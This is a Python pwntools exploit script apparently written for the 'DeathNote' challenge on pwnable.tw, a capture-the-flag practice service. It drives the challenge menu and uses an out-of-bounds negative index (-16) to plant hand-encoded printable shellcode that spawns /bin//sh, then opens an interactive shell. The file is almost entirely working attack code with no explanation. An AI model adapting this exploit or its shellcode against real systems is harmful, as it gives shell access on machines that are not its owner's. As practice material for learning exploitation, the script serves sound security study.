from pwn import *

addr = "chall.pwnable.tw"
port = 10201
s = remote(addr, port)

def Menu():
    sleep(0.3)
    print s.recvuntil("-----------------------------------")
    print s.recvuntil("             DeathNote             ")
    print s.recvuntil("-----------------------------------")
    print s.recvuntil(" 1. Add a name                     ")
    print s.recvuntil(" 2. show a name on the note        ")
    print s.recvuntil(" 3. delete a name int the note     ")
    print s.recvuntil(" 4. Exit                           ")
    print s.recvuntil("-----------------------------------")
    print s.recvuntil("Your choice :")

def Add(_index, _name):
    Menu()
    s.send("1")
    sleep(0.3)
    print s.recvuntil("Index :")
    s.send(_index)
    sleep(0.3)
    print s.recvuntil("Name :")
    s.sendline(_name)

shellcode = "\x30\x42\x26\x30\x42\x27\x53\x58\x53\x5A\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x54\x5B\x50\x53\x54\x59\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x3D\x70"

Add("-16", shellcode)

s.interactive()
s.close()
